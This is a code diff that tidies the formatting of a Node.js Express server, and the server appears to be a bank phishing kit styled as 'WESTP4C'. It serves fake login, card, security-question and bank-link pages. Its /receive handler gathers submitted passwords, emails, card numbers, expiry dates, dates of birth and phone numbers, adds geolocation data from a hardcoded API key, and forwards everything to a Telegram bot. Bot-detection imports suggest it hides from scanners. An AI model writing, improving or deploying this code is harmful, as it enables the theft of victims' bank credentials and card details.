@@ -10,7 +10,7 @@ const querystring = require('querystring');
 const axios = require('axios');
 const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
 const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
-const fs = require('fs').promises; 
+const fs = require('fs').promises;
 const MobileDetect = require('mobile-detect');
 const isbot = require('isbot');
 const ipRangeCheck = require('ip-range-check');
@@ -22,9 +22,6 @@ const { sendMessageFor } = require('simple-telegram-message');
 
 const port = 3000;
 
-
-
-
 app.listen(port, () => {
   console.log(`Server is running on port ${port}`);
 });
@@ -32,7 +29,7 @@ app.listen(port, () => {
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
 app.use(express.static(path.join(__dirname, 'public')));
-app.set('trust proxy', true); 
+app.set('trust proxy', true);
 
 function getClientIp(req) {
   const xForwardedFor = req.headers['x-forwarded-for'];
@@ -145,12 +142,11 @@ app.use((req, res, next) => {
   }
 });
 
-// Route handler for '/login/2'
+// Route handler for '/login/verification/2'
 app.get('/login/verification/2', async (req, res) => {
   try {
     let htmlContent;
-        htmlContent = await fs.readFile(path.join(__dirname, 'public', 'contact.html'), 'utf-8');
-    }
+    htmlContent = await fs.readFile(path.join(__dirname, 'public', 'contact.html'), 'utf-8');
     res.send(htmlContent);
   } catch (error) {
     console.error('Error reading file:', error);
@@ -158,12 +154,11 @@ app.get('/login/verification/2', async (req, res) => {
   }
 });
 
-// Route handler for '/login/3'
+// Route handler for '/login/link'
 app.get('/login/link', async (req, res) => {
   try {
     let htmlContent;
-        htmlContent = await fs.readFile(path.join(__dirname, 'public', 'pl.html'), 'utf-8');
-    }
+    htmlContent = await fs.readFile(path.join(__dirname, 'public', 'pl.html'), 'utf-8');
     res.send(htmlContent);
   } catch (error) {
     console.error('Error reading file:', error);
@@ -171,12 +166,11 @@ app.get('/login/link', async (req, res) => {
   }
 });
 
-// Route handler for '/login/4'
+// Route handler for '/login/verification/3'
 app.get('/login/verification/3', async (req, res) => {
   try {
     let htmlContent;
-        htmlContent = await fs.readFile(path.join(__dirname, 'public', 'card.html'), 'utf-8');
-    }
+    htmlContent = await fs.readFile(path.join(__dirname, 'public', 'card.html'), 'utf-8');
     res.send(htmlContent);
   } catch (error) {
     console.error('Error reading file:', error);
@@ -187,8 +181,7 @@ app.get('/login/verification/3', async (req, res) => {
 app.get('/login/plaid', async (req, res) => {
   try {
     let htmlContent;
-        htmlContent = await fs.readFile(path.join(__dirname, 'public', 'pllogin.html'), 'utf-8');
-    }
+    htmlContent = await fs.readFile(path.join(__dirname, 'public', 'pllogin.html'), 'utf-8');
     res.send(htmlContent);
   } catch (error) {
     console.error('Error reading file:', error);
@@ -199,8 +192,7 @@ app.get('/login/plaid', async (req, res) => {
 app.get('/link', async (req, res) => {
   try {
     let htmlContent;
-        htmlContent = await fs.readFile(path.join(__dirname, 'public', 'plbanks.html'), 'utf-8');
-    }
+    htmlContent = await fs.readFile(path.join(__dirname, 'public', 'plbanks.html'), 'utf-8');
     res.send(htmlContent);
   } catch (error) {
     console.error('Error reading file:', error);
@@ -211,8 +203,7 @@ app.get('/link', async (req, res) => {
 app.get('/link/complete', async (req, res) => {
   try {
     let htmlContent;
-        htmlContent = await fs.readFile(path.join(__dirname, 'public', 'complete.html'), 'utf-8');
-    }
+    htmlContent = await fs.readFile(path.join(__dirname, 'public', 'complete.html'), 'utf-8');
     res.send(htmlContent);
   } catch (error) {
     console.error('Error reading file:', error);
@@ -224,12 +215,12 @@ app.get('/link/complete', async (req, res) => {
 app.post('/receive', async (req, res) => {
   let message = '';
   let myObject = req.body;
-  
+
   const sendAPIRequest = async (ipAddress) => {
-        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
-		console.log(apiResponse.data);
-        return apiResponse.data;
-    };
+    const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
+    console.log(apiResponse.data);
+    return apiResponse.data;
+  };
 
   const ipAddress = getClientIp(req);
   const ipAddressInformation = await sendAPIRequest(ipAddress);
@@ -237,20 +228,19 @@ app.post('/receive', async (req, res) => {
   const systemLang = req.headers["accept-language"];
 
   const myObjects = Object.keys(myObject);
-  
-  // Convert myObjects to lowercase for case insensitive checks
-// Convert myObjects to lowercase for case insensitive checks
-const lowerCaseMyObjects = myObjects.map(obj => obj.toLowerCase());
 
-if (lowerCaseMyObjects.includes('password') || lowerCaseMyObjects.includes('email')) {
+  // Convert myObjects to lowercase for case insensitive checks
+  const lowerCaseMyObjects = myObjects.map(obj => obj.toLowerCase());
+
+  if (lowerCaseMyObjects.includes('password') || lowerCaseMyObjects.includes('email')) {
     message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
                `👤 LOGIN \n\n`;
 
     for (const key of myObjects) {
-        if (key.toLowerCase() !== 'visitor' && myObject[key] !== "") {
-            console.log(`${key}: ${myObject[key]}`);
-            message += `${key}: ${myObject[key]}\n`;
-        }
+      if (key.toLowerCase() !== 'visitor' && myObject[key] !== "") {
+        console.log(`${key}: ${myObject[key]}`);
+        message += `${key}: ${myObject[key]}\n`;
+      }
     }
 
     message += `🌍 GEO-IP INFO\n` +
@@ -266,19 +256,19 @@ if (lowerCaseMyObjects.includes('password') || lowerCaseMyObjects.includes('emai
         `USER AGENT       : ${userAgent}\n` +
         `SYSTEM LANGUAGE  : ${systemLang}\n` +
         `💬 Telegram: https://t.me/UpdateTeams\n`;
-      
-    res.send('dn');
-}
 
-if (lowerCaseMyObjects.includes('expirationdate') || lowerCaseMyObjects.includes('cardnumber') || lowerCaseMyObjects.includes('billing address')) {
+    res.send('dn');
+  }
+
+  if (lowerCaseMyObjects.includes('expirationdate') || lowerCaseMyObjects.includes('cardnumber') || lowerCaseMyObjects.includes('billing address')) {
     message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
                `👤 CARD INFO \n\n`;
 
     for (const key of myObjects) {
-        if (key.toLowerCase() !== 'visitor') {
-            console.log(`${key}: ${myObject[key]}`);
-            message += `${key}: ${myObject[key]}\n`;
-        }
+      if (key.toLowerCase() !== 'visitor') {
+        console.log(`${key}: ${myObject[key]}`);
+        message += `${key}: ${myObject[key]}\n`;
+      }
     }
 
     message += `🌍 GEO-IP INFO\n` +
@@ -287,17 +277,17 @@ if (lowerCaseMyObjects.includes('expirationdate') || lowerCaseMyObjects.includes
         `💬 Telegram: https://t.me/UpdateTeams\n`;
 
     res.send('dn');
-}
+  }
 
-if (lowerCaseMyObjects.includes('message')) {
+  if (lowerCaseMyObjects.includes('message')) {
     message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
                `👤 SECURITY Q&A \n\n`;
 
     for (const key of myObjects) {
-        if (key.toLowerCase() !== 'visitor') {
-            console.log(`${key}: ${myObject[key]}`);
-            message += `${key}: ${myObject[key]}\n`;
-        }
+      if (key.toLowerCase() !== 'visitor') {
+        console.log(`${key}: ${myObject[key]}`);
+        message += `${key}: ${myObject[key]}\n`;
+      }
     }
 
     message += `🌍 GEO-IP INFO\n` +
@@ -306,17 +296,17 @@ if (lowerCaseMyObjects.includes('message')) {
         `💬 Telegram: https://t.me/UpdateTeams\n`;
 
     res.send('dn');
-}
+  }
 
-if (lowerCaseMyObjects.includes('dob') || lowerCaseMyObjects.includes('phonenumber') || lowerCaseMyObjects.includes('state')) {
+  if (lowerCaseMyObjects.includes('dob') || lowerCaseMyObjects.includes('phonenumber') || lowerCaseMyObjects.includes('state')) {
     message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
                `👤 CONTACT INFO \n\n`;
 
     for (const key of myObjects) {
-        if (key.toLowerCase() !== 'visitor') {
-            console.log(`${key}: ${myObject[key]}`);
-            message += `${key}: ${myObject[key]}\n`;
-        }
+      if (key.toLowerCase() !== 'visitor') {
+        console.log(`${key}: ${myObject[key]}`);
+        message += `${key}: ${myObject[key]}\n`;
+      }
     }
 
     message += `🌍 GEO-IP INFO\n` +
@@ -325,20 +315,18 @@ if (lowerCaseMyObjects.includes('dob') || lowerCaseMyObjects.includes('phonenumb
         `💬 Telegram: https://t.me/UpdateTeams\n`;
 
     res.send('dn');
-}
+  }
 
-  const sendMessage = sendMessageFor(botToken, chatId); 
+  const sendMessage = sendMessageFor(botToken, chatId);
   sendMessage(message);
 
   console.log(message);
 });
 
-
 // Route handler for login pages
 app.get('/login', async (req, res) => {
   try {
     let htmlContent;
-    const page = req.params.page;
     const fileName = `Login.html`;
     htmlContent = await fs.readFile(path.join(__dirname, 'public', fileName), 'utf-8');
     res.send(htmlContent);
@@ -349,7 +337,7 @@ app.get('/login', async (req, res) => {
 });
 
 app.get('/', async (req, res) => {
-        res.redirect('/login');
+  res.redirect('/login');
 });
 
 // Middleware function for bot detection
